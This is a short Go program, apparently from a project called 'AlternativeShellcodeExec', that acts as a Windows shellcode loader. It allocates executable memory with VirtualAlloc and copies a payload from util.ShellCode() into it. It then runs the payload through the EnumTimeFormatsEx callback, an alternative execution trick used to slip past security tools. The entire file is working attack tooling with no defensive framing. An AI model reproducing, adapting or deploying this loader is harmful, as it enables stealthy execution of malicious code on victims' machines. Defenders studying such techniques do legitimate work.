package main

import (
	"AlternativeShellcodeExec/pkg/util"
	"fmt"
	"syscall"
	"unsafe"
)

const (
	MEM_RESERVE            = 0x2000
	MEM_COMMIT             = 0x1000
	PAGE_EXECUTE_READWRITE = 0x40
)

func Run(op []byte) {
	// 为存储 op 分配内存
	kernel32, _ := syscall.LoadDLL("kernel32.dll")
	virtualAlloc, _ := kernel32.FindProc("VirtualAlloc")
	addr, _, _ := virtualAlloc.Call(0, uintptr(len(op)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)

	// 处理 op 数组
	for i := range op {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = op[i]
	}

	// 使用 EnumTimeFormatsEx 调用 shellcode
	enumTimeFormatsEx, _ := kernel32.FindProc("EnumTimeFormatsEx")
	ret, _, err := enumTimeFormatsEx.Call(addr, uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(""))), 0x00, 0)
	if err != nil {
		fmt.Println("Error enumTimeFormatsEx", err)
		return
	}
	if ret == 0 {
		println("EnumTimeFormatsEx failed:")
		return
	}

}

func main() {
	Run(util.ShellCode())
}
